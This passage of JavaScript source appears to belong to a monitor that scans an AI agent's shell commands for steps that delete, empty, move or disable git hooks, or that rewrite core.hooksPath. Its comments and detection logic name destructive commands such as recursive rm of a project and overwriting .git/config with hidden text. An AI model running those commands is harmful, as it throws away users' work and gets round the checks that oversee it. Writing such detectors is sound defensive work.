  const m = /^(-?\d+|[A-Za-z])\.\.(-?\d+|[A-Za-z])(?:\.\.(-?\d+))?$/.exec(inner);
  if (!m) return null;
  const num = /^-?\d+$/.test(m[1]);
  if (num !== /^-?\d+$/.test(m[2])) return null;
  const a = num ? Number(m[1]) : m[1].charCodeAt(0);
  const b = num ? Number(m[2]) : m[2].charCodeAt(0);
  const step = Math.abs(Number(m[3] ?? 1)) || 1;
  const out = [];
  for (let v = a; a <= b ? v <= b : v >= b; v += a <= b ? step : -step) {
    out.push(num ? String(v) : String.fromCharCode(v));
    if (out.length > max) break; // one more than max: the caller reads it as too big
  }
  return out;
}

/** At most this many characters are read while expanding one brace word: more than any real one. */
const BRACE_BUDGET = 256 * 1024;

/** What braceExpand gives for a word too big to expand within BRACE_BUDGET (it fails closed). */
export const BRACE_TOO_BIG = Object.freeze(['{...}']);

/**
 * The leftmost brace the shell expands in a word, found in one pass: a "{" (not "${") whose
 * matching "}" is there, with a comma directly inside or a range. Returns {open, close, alts} or
 * null.
 */
function firstBrace(w, max) {
  const stack = [];
  let best = null;
  for (let j = 0; j < w.length; j += 1) {
    const ch = w[j];
    if (ch === '{') stack.push({ open: j, commas: [], literal: j > 0 && w[j - 1] === '$' });
    else if (ch === ',' && stack.length) stack[stack.length - 1].commas.push(j);
    else if (ch === '}' && stack.length) {
      const b = stack.pop();
      if (b.literal || (best && best.open < b.open)) continue;
      let alts = null;
      if (b.commas.length) {
        alts = [];
        let start = b.open + 1;
        for (const c of b.commas) {
          alts.push(w.slice(start, c));
          start = c + 1;
        }
        alts.push(w.slice(start, j));
      } else if (j - b.open <= 48) alts = braceRange(w.slice(b.open + 1, j), max);
      if (alts) best = { open: b.open, close: j, alts };
    }
  }
  return best;
}

/**
 * Brace expansion as bash and zsh do it before anything else (ADR-0111 review): "pre-{commit,push}"
 * is two words, "pre-commit{,.bak}" is "pre-commit" and "pre-commit.bak", "{1..3}" counts. A brace
 * with no comma and no range ("stash@{2}", "${HOME}") is kept as written. Returns the words, or
 * null when the word has nothing to expand. A word that would give more than `max` words, or take
 * more than BRACE_BUDGET characters of reading, gives BRACE_TOO_BIG, so no word can hold the check
 * or hide a guard past the end of a long list (second review); callers read it as the worst case.
 */
export function braceExpand(word, max = BRACE_MAX, budget = { left: BRACE_BUDGET }) {
  const w = String(word ?? '');
  budget.left -= w.length;
  if (budget.left < 0) return BRACE_TOO_BIG;
  const b = firstBrace(w, max);
  if (!b) return null;
  const pre = w.slice(0, b.open);
  const post = w.slice(b.close + 1);
  if (b.alts.length > max) return BRACE_TOO_BIG;
  const out = [];
  for (const a of b.alts) {
    const inner = braceExpand(pre + a + post, max, budget);
    if (inner === BRACE_TOO_BIG) return BRACE_TOO_BIG;
    for (const e of inner ?? [pre + a + post]) {
      out.push(e);
      if (out.length > max) return BRACE_TOO_BIG;
    }
  }
  return out;
}

/** Where a brace word too big to expand is read as pointing: the .git folder, the worst case. */
const BRACE_STAND_IN = path.join(UNKNOWN_FOLDER, '.git');

/** A step's words with each bare brace word expanded (the shell expands nothing quoted). */
function withBracesExpanded(args, argDyn, argExp, argSub = []) {
  if (!args.some((a, k) => argExp[k] && !argDyn[k] && String(a).includes('{'))) return { args, argDyn, argSub };
  const outArgs = [];
  const outDyn = [];
  const outSub = [];
  args.forEach((a, k) => {
    const expanded = argExp[k] && !argDyn[k] ? braceExpand(a) : null;
    // A word too big to expand may name anything: it is read as the .git folder.
    const words = expanded === BRACE_TOO_BIG ? [BRACE_STAND_IN] : expanded;
    for (const w of words ?? [a]) {
      outArgs.push(w);
      outDyn.push(Boolean(argDyn[k]));
      outSub.push(argSub[k] || []);
    }
  });
  return { args: outArgs, argDyn: outDyn, argSub: outSub };
}

/** True for a guard file that is there now: changing its content changes the guard. */
function existingGuardFile(p) {
  if (!p || /[*?[]/.test(p)) return false;
  try {
    return !fs.lstatSync(p).isDirectory();
  } catch {
    return false;
  }
}

/**
 * A git settings file (ADR-0111 review): a repository's .git/config or config.worktree (a
 * submodule's or a linked worktree's too), ~/.gitconfig, ~/.config/git/config, /etc/gitconfig.
 * core.hooksPath set or taken away there changes where git takes its guards from.
 */
export function isGitConfigPath(p) {
  if (!p) return false;
  const s = String(p).replace(/\\/g, '/');
  // Case is ignored, as a Mac's disk ignores it (".GIT/config" is the same file).
  return /(^|\/)\.git\/((modules\/.+|worktrees\/[^/]+)\/)?config(\.worktree)?$/i.test(s) || /(^|\/)\.gitconfig$/i.test(s) || /(^|\/)\.config\/git\/config$/i.test(s) || /^\/etc\/gitconfig$/i.test(s);
}

/** Words that name core.hooksPath, as a git setting or in a settings file ("hooksPath = x"). */
const HOOKS_PATH_TEXT = /hooks\s*path/i;

/**
 * A plain file's text as it is now (the first 256 KB), or null when it is not there, is not a plain
 * file, or cannot be read. It is opened without waiting and checked before it is read, so a named
 * pipe or a device never holds the check (ADR-0111 review).
 */
function plainFileText(p) {
  if (!p || /[*?[]/.test(p)) return null;
  let fd;
  try {
    fd = fs.openSync(p, fs.constants.O_RDONLY | (fs.constants.O_NONBLOCK ?? 0));
  } catch {
    return null;
  }
  try {
    if (!fs.fstatSync(fd).isFile()) return null;
    const buf = Buffer.alloc(256 * 1024);
    const n = fs.readSync(fd, buf, 0, buf.length, 0);
    return buf.subarray(0, n).toString('utf8');
  } catch {
    return null;
  } finally {
    try {
      fs.closeSync(fd);
    } catch {
      // nothing to do
    }
  }
}

/** True when this file is there and names core.hooksPath. */
function fileMentionsHooksPath(p) {
  const text = plainFileText(p);
  return text !== null && HOOKS_PATH_TEXT.test(text);
}

/** The words a settings file change names in `why`. */
function hooksPathWhy(p, ctx) {
  return `changes where git takes its guards from (core.hooksPath in ${guardShown(p, ctx)})`;
}

/** The words for a write into a settings file whose text the command does not show. */
function hiddenSettingsWhy(p, ctx) {
  return `may change where git takes its guards from (writes ${guardShown(p, ctx)} with text this command does not show)`;
}

/**
 * Whether a chmod mode takes the owner's execute bit away ("-x", "a-x", "u=rw", "644", "000"): git
 * runs only hooks it can execute, so that turns a guard off.
 */
function chmodTurnsOff(mode) {
  const m = String(mode);
  if (/^[0-7]{1,4}$/.test(m)) {
    const d = m.padStart(3, '0');
    return (Number(d[d.length - 3]) & 1) === 0;
  }
  return m.split(',').some((clause) => {
    const c = /^([ugoa]*)([-+=])([rwxXst]*)$/.exec(clause);
    if (!c) return false;
    const owner = c[1] === '' || c[1].includes('u') || c[1].includes('a');
    if (!owner) return false;
    if (c[2] === '-') return c[3].includes('x');
    if (c[2] === '=') return !/[xX]/.test(c[3]);
    return false;
  });
}

/**
 * Operands of a file tool: words that are not options ("--" ends them; valueOpts take the next
 * word), each with the text of its command substitutions (`sub`).
 */
function fileOperands(args, argDyn, valueOpts = [], argSub = []) {
  const ops = [];
  let options = true;
  for (let k = 0; k < args.length; k += 1) {
    const a = String(args[k]);
    if (options && a === '--') {
      options = false;
      continue;
    }
    if (options && a.startsWith('-') && a !== '-') {
      if (valueOpts.includes(a)) k += 1;
      continue;
    }
    ops.push({ w: a, dyn: Boolean(argDyn[k]), sub: argSub[k] || [] });
  }
  return ops;
}

/** Programs that copy or link a file over another: the last operand (or -t's folder) is written. */
const FILE_REPLACERS = new Set(['cp', 'mv', 'install', 'ln', 'rsync', 'ditto', 'copy-item', 'move-item', 'gcp', 'gmv']);

/** find's tests that match by name, by path or by a regular expression ("-i" ignores case). */
const FIND_MATCH_TESTS = new Set(['-name', '-iname', '-path', '-ipath', '-wholename', '-iwholename', '-regex', '-iregex']);

/** find's other tests and actions that take one word after them. */
const FIND_ONE_VALUE = new Set(['-lname', '-ilname', '-maxdepth', '-mindepth', '-newer', '-anewer', '-cnewer', '-user', '-group', '-uid', '-gid', '-perm', '-size', '-mtime', '-mmin', '-atime', '-amin', '-ctime', '-cmin', '-used', '-links', '-inum', '-samefile', '-fstype', '-context', '-printf', '-fprint', '-fprint0', '-fls', '-regextype', '-files0-from']);

/**
 * find's expression from word `start` on, as the "-o" branches it runs: each branch's tests (name,
 * path, regex and type), whether it deletes (-delete, or -exec of a deleter) and whether it
 * prunes. With parentheses, the branches are read as one (parens: true).
 */
function findExpression(args, start) {
  const fresh = () => ({ tests: [], deletes: false, prune: false });
  const branches = [fresh()];
  let parens = false;
  let negate = false;
  for (let k = start; k < args.length; k += 1) {
    const a = String(args[k]);
    const b = branches[branches.length - 1];
    if (a === '(' || a === ')') {
      parens = true;
      negate = false;
    } else if (a === '!' || a === '-not') {
      negate = !negate;
    } else if (a === '-o' || a === '-or') {
      branches.push(fresh());
      negate = false;
    } else if (a === '-delete') {
      b.deletes = true;
      negate = false;
    } else if (a === '-prune') {
      b.prune = true;
      negate = false;
    } else if (/^-(exec|execdir|ok|okdir)$/.test(a)) {
      if (DELETERS.has(baseName(args[k + 1] ?? ''))) b.deletes = true;
      let j = k + 1;
      while (j < args.length && args[j] !== ';' && args[j] !== '+') j += 1;
      k = j;
      negate = false;
    } else if (FIND_MATCH_TESTS.has(a) || a === '-type' || a === '-xtype') {
      b.tests.push({ kind: a === '-xtype' ? '-type' : a, value: String(args[k + 1] ?? ''), negated: negate });
      k += 1;
      negate = false;
    } else if (a === '-empty') {
      // An empty hook or an empty hooks folder guards nothing: a branch that deletes only empty
      // files never takes a guard away ("find . -type d -empty -delete").
      b.tests.push({ kind: '-empty', value: '', negated: negate });
      negate = false;
    } else if (FIND_ONE_VALUE.has(a) || /^-newer[a-zA-Z]{2}$/.test(a)) {
      k += 1;
      negate = false;
    } else if (a === '-fprintf') {
      k += 2;
      negate = false;
    } else negate = false;
  }
  return { branches, parens };
}

/**
 * The end every path a find regex matches must have, or null when it may end in anything. find
 * matches the whole path, so with no alternation a trailing run of plain characters is required
 * ("-regex '.*\\.pyc'" ends ".pyc"). Only plain characters and "\\." "\\-" "\\/" count; anything
 * else (a quantifier, a bracket, a group) ends the run, which only makes it shorter. A
 * quantifier after a character applies to the one before the run, so the run stays required.
 */
function findRegexEnd(re) {
  const r = String(re).replace(/\$$/, '');
  if (/\|/.test(r)) return null; // alternation, in every regex type find takes
  let end = '';
  let i = r.length - 1;
  while (i >= 0) {
    const ch = r[i];
    const escaped = i > 0 && r[i - 1] === '\\' && !(i > 1 && r[i - 2] === '\\');
    if (escaped) {
      if (!/[./-]/.test(ch)) break;
      end = ch + end;
      i -= 2;
    } else if (/[A-Za-z0-9_\-/,=@%:~ ]/.test(ch)) {
      end = ch + end;
      i -= 1;
    } else break;
  }
  return end || null;
}

/**
 * Whether one find test could be true for this file. Patterns are matched by globMatch, never as
 * a regular expression the agent wrote (ADR-0111 review: "-regex '(.*)*q'" held the check for over
 * a minute). A -regex or -iregex test could match unless the path cannot end as it must.
 */
function findTestMatches(t, cand) {
  const ci = /^-i/.test(t.kind);
  if (t.kind === '-empty') return false;
  if (t.kind === '-type') return cand.dir ? /d/.test(t.value) : /[fl]/.test(t.value);
  if (/regex/.test(t.kind)) {
    const end = findRegexEnd(t.value);
    if (!end) return true;
    return ci ? cand.shown.toLowerCase().endsWith(end.toLowerCase()) : cand.shown.endsWith(end);
  }
  if (t.kind === '-name' || t.kind === '-iname') return globMatch(t.value, cand.name, { ignoreCase: ci });
  return globMatch(t.value, cand.shown, { ignoreCase: ci });
}

/** A name, path or regex test that names something (has a letter or a digit), not "*". */
function findTestIsSpecific(t) {
  return t.kind !== '-type' && !t.negated && /[A-Za-z0-9]/.test(t.value);
}

/** Whether a find branch's tests could all be true for this file (a negated test could be). */
function findBranchMatches(branch, cand, parens) {
  const positive = branch.tests.filter((t) => !t.negated);
  if (!parens) return positive.every((t) => findTestMatches(t, cand));
  // Parentheses: the name tests are read as alternatives, the type tests all hold.
  const types = positive.filter((t) => t.kind === '-type');
  const names = positive.filter((t) => t.kind !== '-type' && t.kind !== '-empty');
  if (!parens || positive.some((t) => t.kind === '-empty') && !names.length) {
    if (positive.some((t) => t.kind === '-empty')) return false;
  }
  return types.every((t) => findTestMatches(t, cand)) && (names.length === 0 || names.some((t) => findTestMatches(t, cand)));
}

/**
 * The guards find reaches from one root, as find shows them (the root as written, then the rest):
 * a repository's hooks folder and each hook by name, the .git folder a "-prune" may skip, and
 * whether the root holds a repository there now.
 */
function findGuardCandidates(rootWord, rootAbs) {
  const prefix = String(rootWord).replace(/[\\/]+$/, '') || '/';
  const under = (...rest) => (prefix === '/' ? `/${rest.join('/')}` : [prefix, ...rest].join('/'));
  const hooksAt = (abs, shown) => [{ abs, shown, name: 'hooks', dir: true }, ...GIT_HOOK_NAMES.map((n) => ({ abs: path.join(abs, n), shown: `${shown}/${n}`, name: n, dir: false }))];
  const segs = rootAbs.split(/[\\/]+/);
  let gi = -1;
  segs.forEach((seg, i) => {
    if (seg && segmentIs(seg, '.git')) gi = i;
  });
  if (gi === -1) {
    let holdsRepo = false;
    try {
      holdsRepo = fs.existsSync(path.join(rootAbs, '.git'));
    } catch {
      holdsRepo = false;
    }
    return { list: hooksAt(path.join(rootAbs, '.git', 'hooks'), under('.git', 'hooks')), gitDir: { shown: under('.git'), name: '.git', dir: true }, holdsRepo };
  }
  const rest = segs.slice(gi + 1).filter(Boolean);
  if (rest.length === 0) return { list: hooksAt(path.join(rootAbs, 'hooks'), under('hooks')), gitDir: null, holdsRepo: true };
  if (segmentIs(rest[0], 'hooks') && rest.length === 1) return { list: hooksAt(rootAbs, prefix), gitDir: null, holdsRepo: true };
  if (isGitGuardPath(rootAbs)) return { list: [{ abs: rootAbs, shown: prefix, name: rest[rest.length - 1], dir: rest.length === 1 }], gitDir: null, holdsRepo: true };
  return { list: [], gitDir: null, holdsRepo: false };
}

/**
 * The first guard a find step deletes (ADR-0111 review), or null: a hook or the hooks folder that
 * one of its deleting branches matches by name, path or type, unless a branch prunes the .git
 * folder first. Under a root that holds no repository now, only a test that names the hook counts
 * ("find ~ -name pre-commit -delete"), so "find build -type f -delete" names nothing.
 */
function findGuardHit(args, argDyn, ctx, argSub = []) {
  let k = 0;
  while (k < args.length && /^-(H|L|P|O\d*)$/.test(String(args[k]))) k += 1;
  if (args[k] === '-D') k += 2;
  const roots = [];
  for (; k < args.length && !String(args[k]).startsWith('-') && args[k] !== '(' && args[k] !== '!'; k += 1) roots.push({ w: String(args[k]), dyn: Boolean(argDyn[k]), sub: argSub[k] || [] });
  if (!roots.length) roots.push({ w: '.', dyn: false });
  const { branches, parens } = findExpression(args, k);
  const all = parens ? [{ tests: branches.flatMap((b) => b.tests), deletes: branches.some((b) => b.deletes), prune: false }] : branches;
  const deleting = all.filter((b) => b.deletes);
  if (!deleting.length) return null;
  for (const root of roots) {
    const known = guardPathWord(root.w, root.dyn, ctx);
    const dyn = root.dyn ? dynamicGuardWord(root.w, root.sub) : null;
    const rootAbs = known ?? dyn ?? path.join(UNKNOWN_FOLDER, root.dyn ? 'folder' : root.w);
    const { list, gitDir, holdsRepo } = findGuardCandidates(dyn ? guardShown(dyn, ctx) : root.w, rootAbs);
    // "find . -path ./.git -prune -o ... -delete": the .git folder is never entered.
    const pruned = !parens && gitDir && all.some((b) => b.prune && !b.deletes && b.tests.some((t) => !t.negated) && findBranchMatches(b, gitDir, false));
    if (pruned) continue;
    for (const cand of list) {
      for (const b of deleting) {
        if (!holdsRepo && !b.tests.some((t) => findTestIsSpecific(t) && findTestMatches(t, cand))) continue;
        if (findBranchMatches(b, cand, parens)) return cand.abs;
      }
    }
  }
  return null;
}

/** Backslash escapes as echo -e, zsh's echo, printf and sed read them, so "\x68ooksPath" is read as it runs. */
function decodeEscapes(text) {
  return String(text).replace(/\\(x[0-9A-Fa-f]{1,2}|u[0-9A-Fa-f]{1,4}|U[0-9A-Fa-f]{1,8}|0?[0-7]{1,3}|[\s\S])/g, (m, e) => {
    if (/^[xuU]/.test(e) && e.length > 1) {
      const cp = parseInt(e.slice(1), 16);
      return cp <= 0x10ffff ? String.fromCodePoint(cp) : '';
    }
    if (/^0?[0-7]{1,3}$/.test(e)) return String.fromCharCode(parseInt(e, 8) & 0xff);
    return { n: '\n', t: '\t', r: '\r', a: '\x07', b: '\b', f: '\f', v: '\v', e: '\x1b' }[e] ?? e;
  });
}

/** True when text names core.hooksPath, as written or once its backslash escapes are read. */
function namesHooksPath(text) {
  const t = String(text ?? '');
  return HOOKS_PATH_TEXT.test(t) || HOOKS_PATH_TEXT.test(decodeEscapes(t));
}

/**
 * The text a step prints when the command shows all of it (ADR-0111 review), or null: echo or
 * printf of fixed words (a printf format that fills in values is not shown: printf 'h%sPath'
 * ooks), or cat or tee of a here-document, a here-string, or a shown step before it in a pipe.
 * Text from a file, another program or a value named only when the command runs is not shown.
 */
function shownOutput(seg, depth = 0) {
  if (!seg || depth > 8) return null;
  const words = (seg.words || []).map(String);
  if (!words.length || (seg.dynamic || []).some(Boolean)) return null;
  const prog = baseName(words[0]);
  const args = words.slice(1);
  if (prog === 'echo') {
    let k = 0;
    while (k < args.length && /^-[neE]+$/.test(args[k])) k += 1;
    return args.slice(k).join(' ');
  }
  if (prog === 'printf') {
    let k = 0;
    if (args[k] === '--') k += 1;
    if (args[k] === '-v') return '';
    const format = args[k] ?? '';
    return /%/.test(format.replace(/%%/g, '')) ? null : format;
  }
  if (prog === 'cat' || prog === 'tee' || prog === 'tee-object') {
    // cat's operands are what it reads; tee's are where it writes.
    if (prog === 'cat' && args.some((a) => a === '-' || !a.startsWith('-'))) return null;
    const input = stdinText(seg);
    if (input) return input.dynamic ? null : input.text;
    if ((seg.redirects || []).some((r) => INPUT_REDIRECTS.has(r.op))) return null;
    return seg.piped && seg.pipeFrom ? shownOutput(seg.pipeFrom, depth + 1) : null;
  }
  return null;
}

/** Whether a delete step takes folders whole: rm -r, Remove-Item -Recurse, rd /s, trash. */
function deletesRecursively(prog, args) {
  const words = args.map(String);
  if (prog === 'trash') return true;
  if (prog === 'remove-item') return words.some((a) => /^-r(e(c(u(r(s(e)?)?)?)?)?)?$/i.test(a));
  if (prog === 'del' || prog === 'erase' || prog === 'rd' || prog === 'rmdir') return words.some((a) => /^\/s$/i.test(a));
  if (prog !== 'rm') return false;
  return words.some((a) => /^--r(e(c(u(r(s(i(v(e)?)?)?)?)?)?)?)?$/.test(a) || /^-[A-Za-z]*[rR]/.test(a));
}

/**
 * What a folder's .git is: 'guarded' (a .git folder with a hook installed, or core.hooksPath set),
 * 'plain' (a .git folder with neither: a fresh clone), 'worktree' (a .git file: a linked worktree
 * or a submodule's working folder), or null when the folder holds no repository.
 */
function gitFolderKind(dir) {
  const g = path.join(dir, '.git');
  let st;
  try {
    st = fs.lstatSync(g);
  } catch {
    return null;
  }
  if (!st.isDirectory()) return 'worktree';
  try {
    if (fs.readdirSync(path.join(g, 'hooks')).some((n) => GIT_HOOK_NAMES.includes(n.toLowerCase()))) return 'guarded';
  } catch {
    // no hooks folder
  }
  return fileMentionsHooksPath(path.join(g, 'config')) ? 'guarded' : 'plain';
}

/**
 * A recursive step (a delete, or chmod -R) on a folder that reaches a repository whole (ADR-0111
 * review): the project or a folder that holds it ("rm -rf ../proj", "cd .. && rm -rf proj",
 * "rm -rf ~/code/*", "rm -rf $(git rev-parse --show-toplevel)"), or another repository with a
 * guard installed or a linked worktree. A fresh clone with no guard is left as it was. Returns
 * {folder, guards, work}: guards when the git guards go with it, work when uncommitted changes
 * may. Null for anything else.
 */
function repositoryReached(o, ctx) {
  let p = guardPathWord(o.w, o.dyn, ctx);
  if (!p && o.dyn) p = dynamicProjectTop(o.w, o.sub, ctx);
  if (!p || p.startsWith(UNKNOWN_FOLDER + path.sep)) return null;
  p = p.replace(/[\\/]+$/, '') || path.sep;
  if (/[*?[]/.test(p)) {
    // A glob in the last part, over a folder that holds the project: it takes the project's folder.
    const dir = path.dirname(p);
    if (/[*?[]/.test(dir) || dir === ctx.project || !isWithin(ctx.project, dir)) return null;
    const child = path.relative(dir, ctx.project).split(path.sep)[0];
    if (!segmentIs(path.basename(p), child)) return null;
    p = path.join(dir, child);
  }
  if (isWithin(ctx.project, p)) {
    // The project, or a folder that holds it: the project's repository is at it or above it.
    for (let d = ctx.project; ; d = path.dirname(d)) {
      const kind = gitFolderKind(d);
      if (kind) return { folder: p, guards: kind === 'guarded', work: true };
      if (d === p || path.dirname(d) === d || !isWithin(path.dirname(d), p)) return null;
    }
  }
  const kind = gitFolderKind(p);
  if (kind === 'guarded' || kind === 'worktree') return { folder: p, guards: kind === 'guarded', work: true };
  return null;
}

/**
 * A shell step that removes, moves, empties or turns off a git guard (ADR-0111): rm and the other
 * deleters, find -delete, mv of a guard away, a copy or link over a guard that is there, truncate,
 * dd, tee without -a, sed -i or perl -i on one, and chmod that takes away the execute bit. Writing
 * a new hook where none is installs a guard, so it is not named. A recursive delete or chmod -R of
 * a folder that holds a repository whole reaches its guards and its uncommitted changes. A step
 * that writes into a git settings file is never local work: it names code.remove_guard when what
 * it writes names core.hooksPath (`hooksText`: the command's words name it), takes it away, or is
 * not shown by the command; anything else there can make git run commands, so it is unknown.
 * Brace words are expanded first ("rm .git/hooks/{pre-commit,pre-push}"). Returns the steps it
 * names, [{resource, why}], with resource null for an unknown one.
 */
function guardShellStep(prog, rawArgs, rawDyn, ctx, { argExp = [], argSub = [], hooksText = false, seg = null, out = null } = {}) {
  const { args, argDyn, argSub: subs } = withBracesExpanded(rawArgs, rawDyn, argExp, argSub);
  const guard = (o) => {
    const p = guardPathWord(o.w, o.dyn, ctx);
    if (p) return isGitGuardPath(p) ? p : null;
    return o.dyn ? dynamicGuardWord(o.w, o.sub) : null;
  };
  const config = (o) => {
    const p = guardPathWord(o.w, o.dyn, ctx) ?? (ctx.cwdUnknown && !o.dyn ? path.join(UNKNOWN_FOLDER, String(o.w)) : null);
    return p && isGitConfigPath(p) ? p : null;
  };
  const shown = (p) => guardShown(p, ctx);
  const removes = (why) => [{ resource: INCIDENT_RESOURCES.removeGuard, why }];
  const settingsSteps = (p, text) => {
    if (hooksText || text === null || namesHooksPath(text)) return removes(text === null && !hooksText ? hiddenSettingsWhy(p, ctx) : hooksPathWhy(p, ctx));
    return [{ resource: null, why: `changes the git settings in ${shown(p)}, which can make git run commands` }];
  };
  const reachedSteps = (r, verb) => [
    ...(r.work ? [{ resource: INCIDENT_RESOURCES.discardWork, why: `throws away ${shown(r.folder)} with its uncommitted changes` }] : []),
    ...(r.guards ? [{ resource: INCIDENT_RESOURCES.removeGuard, why: `${verb} the git guards of ${shown(r.folder)}` }] : []),
  ];
  if (DELETERS.has(prog)) {
    // PowerShell's -Path and -LiteralPath are read as switches, so the path after them is an operand.
    const ops = fileOperands(args, argDyn, [], subs);
    const hit = ops.map(guard).find(Boolean);
    if (hit) return removes(`removes the git guard ${shown(hit)}`);
    const settings = ops.map(config).find((p) => p && fileMentionsHooksPath(p));
    if (settings) return removes(hooksPathWhy(settings, ctx));
    if (!deletesRecursively(prog, args)) return [];
    // rm refuses "." and ".." ("rm -rf ." removes nothing).
    const reached = ops.filter((o) => !(prog === 'rm' && /(^|[\\/])\.\.?[\\/]*$/.test(o.w))).map((o) => repositoryReached(o, ctx)).find(Boolean);
    return reached ? reachedSteps(reached, 'removes') : [];
  }
  if (prog === 'find') {
    const hit = findGuardHit(args, argDyn, ctx, subs);
    return hit ? removes(`removes the git guard ${shown(hit)}`) : [];
  }
  if (prog === 'chmod') {
    let mode = null;
    let recursive = false;
    const files = [];
    for (let k = 0; k < args.length; k += 1) {
      const a = String(args[k]);
      if (mode === null && (/^-[RfvchHLP]+$/.test(a) || /^--(recursive|verbose|changes|silent|quiet|no-dereference|dereference|preserve-root|no-preserve-root)$/.test(a))) {
        if (/^-[A-Za-z]*R/.test(a) || a === '--recursive') recursive = true;
        continue;
      }
      if (mode === null && /^--reference(=|$)/.test(a)) return [];
      if (mode === null) {
        if (argDyn[k]) return [];
        mode = a;
        continue;
      }
      files.push({ w: a, dyn: Boolean(argDyn[k]), sub: subs[k] || [] });
    }
    if (mode === null || !chmodTurnsOff(mode)) return [];
    const hit = files.map(guard).find(Boolean);
    if (hit) return removes(`turns off the git guard ${shown(hit)}`);
    const reached = recursive ? files.map((o) => repositoryReached(o, ctx)).find((r) => r && r.guards) : null;
    return reached ? removes(`turns off every git guard of ${shown(reached.folder)}`) : [];
  }
  if (prog === 'truncate') {
    const ops = fileOperands(args, argDyn, ['-s', '--size', '-r', '--reference'], subs);
    const settings = ops.map(config).find(Boolean);
    if (settings) return settingsSteps(settings, fileMentionsHooksPath(settings) ? 'hooksPath' : '');
    const hit = ops.map(guard).find((p) => p && existingGuardFile(p));
    return hit ? removes(`empties the git guard ${shown(hit)}`) : [];
  }
  if (prog === 'dd') {
    // dd of=FILE writes over FILE (from if=, or from what it reads): what it writes is not shown.
    const k = args.findIndex((a) => /^of=/.test(String(a)));
    if (k === -1) return [];
    const o = { w: String(args[k]).slice(3), dyn: Boolean(argDyn[k]), sub: subs[k] || [] };
    const settings = config(o);
    if (settings) return settingsSteps(settings, null);
    const hit = guard(o);
    return hit && existingGuardFile(hit) ? removes(`empties or rewrites the git guard ${shown(hit)}`) : [];
  }
  if (prog === 'tee' || prog === 'tee-object') {
    const ops = fileOperands(args, argDyn, [], subs);
    const settings = ops.map(config).find(Boolean);
    if (settings) return settingsSteps(settings, shownOutput(seg));
    if (args.some((a) => a === '-a' || a === '--append' || /^-[A-Za-z]*a/.test(a))) return [];
    const hit = ops.map(guard).find((p) => p && existingGuardFile(p));
    return hit ? removes(`rewrites the git guard ${shown(hit)}`) : [];
  }
  const inPlace = ((prog === 'sed' || prog === 'gsed') && args.some((a) => /^-[A-Za-z]*i/.test(a) || /^--in-?(place)?(=|$)/.test(a) || /^--in-p/.test(a))) || (prog === 'perl' && args.some((a) => /^-[A-Za-z]*i/.test(a)));
  if (inPlace) {
    const ops = fileOperands(args, argDyn, prog === 'perl' ? ['-e', '-E', '-M', '-I'] : ['-e', '-f', '--expression', '--file', '-l'], subs);
    // What a script rewrites a settings file into is not shown ("s/hooks/&Path/").
    const settings = ops.map(config).find(Boolean);
    if (settings) return settingsSteps(settings, null);
    const hit = ops.map(guard).find((p) => p && existingGuardFile(p));
    return hit ? removes(`changes the git guard ${shown(hit)}`) : [];
  }
  if (FILE_REPLACERS.has(prog)) {
    const ops = fileOperands(args, argDyn, ['-t', '--target-directory', '-S', '--suffix', '-m', '--mode', '-o', '--owner', '-g', '--group', '-e', '--rsh'], subs);
    const target = flagValue(args, ['-t', '--target-directory']);
    const sources = target ? ops : ops.slice(0, -1);
    const dest = target ? { w: target, dyn: false, sub: [] } : ops[ops.length - 1];
    const moves = prog === 'mv' || prog === 'gmv' || prog === 'move-item';
    if (moves && ops.length >= 2) {
      const away = sources.map(guard).find(Boolean);
      if (away) return removes(`moves the git guard ${shown(away)} away`);
      const settingsAway = sources.map(config).find((p) => p && fileMentionsHooksPath(p));
      if (settingsAway) return removes(hooksPathWhy(settingsAway, ctx));
    }
    if (!dest || ops.length < 2) return [];
    // A settings file written over: by a file into a folder (".git/") or by name.
    const destAbs = guardPathWord(dest.w, dest.dyn, ctx);
    let destIsDir = false;
    try {
      destIsDir = Boolean(destAbs) && fs.statSync(destAbs).isDirectory();
    } catch {
      destIsDir = false;
    }
    const settings = destIsDir
      ? sources.map((s) => path.join(destAbs, path.basename(String(s.w)))).find((p) => isGitConfigPath(p))
      : config(dest);
    if (settings) {
      // Taking away a file that sets core.hooksPath, or bringing in text this command does not show:
      // a file this same command wrote, one that is not there, or one that is not a plain file.
      if (fileMentionsHooksPath(settings)) return removes(hooksPathWhy(settings, ctx));
      const texts = sources.map((s) => {
        const sp = guardPathWord(s.w, s.dyn, ctx);
        return !sp || out?.written?.has?.(sp) ? null : plainFileText(sp);
      });
      return settingsSteps(settings, texts.some((t) => t === null) ? null : texts.join('\n'));
    }
    const d = guard(dest);
    if (!d) return [];
    // Over a guard that is there, or into the hooks folder over one of the same name.
    const over = existingGuardFile(d) ? d : sources.map((s) => path.join(d, path.basename(String(s.w)))).find((p) => existingGuardFile(p) && isGitGuardPath(p));
    return over ? removes(`replaces the git guard ${shown(over)}`) : [];
  }
  return [];
}

/**
 * Redirections that write over a guard that is there ("> .git/hooks/pre-commit", ": > ..."): it is
 * emptied or rewritten. One that writes into a git settings file, appended or not, is read as
 * guardShellStep reads a settings write: named when the text names core.hooksPath or the command
 * does not show it ("base64 -d ... >> .git/config"), otherwise unknown. A brace target is
 * expanded, as zsh writes to each file it names. Returns [{resource, why}].
 */
function guardRedirect(seg, ctx, hooksText = false) {
  for (const r of seg.redirects || []) {
    if (!(r.op.startsWith('>') || r.op.startsWith('&>'))) continue;
    const expanded = r.dynamic ? null : braceExpand(r.target);
    // A target too big to expand may name a guard that is there: read as the worst case.
    if (expanded === BRACE_TOO_BIG) return [{ resource: INCIDENT_RESOURCES.removeGuard, why: 'may empty a git guard (writes to a file named by a word too long to read)' }];
    for (const target of expanded ?? [r.target]) {
      const p = guardPathWord(target, r.dynamic, ctx) ?? (ctx.cwdUnknown && !r.dynamic ? path.join(UNKNOWN_FOLDER, String(target)) : null);
      if (!p) continue;
      if (isGitConfigPath(p)) {
        const overwrites = ['>', '>|', '&>', '>&'].includes(r.op);
        const text = shownOutput(seg);
        if (hooksText || text === null || namesHooksPath(text) || (overwrites && fileMentionsHooksPath(p))) {
          return [{ resource: INCIDENT_RESOURCES.removeGuard, why: text === null && !hooksText ? hiddenSettingsWhy(p, ctx) : hooksPathWhy(p, ctx) }];
        }
        return [{ resource: null, why: `changes the git settings in ${guardShown(p, ctx)}, which can make git run commands` }];
      }
      if (['>', '>|', '&>', '>&'].includes(r.op) && isGitGuardPath(p) && existingGuardFile(p)) return [{ resource: INCIDENT_RESOURCES.removeGuard, why: `empties or rewrites the git guard ${guardShown(p, ctx)}` }];
    }
  }
  return [];
}

/**
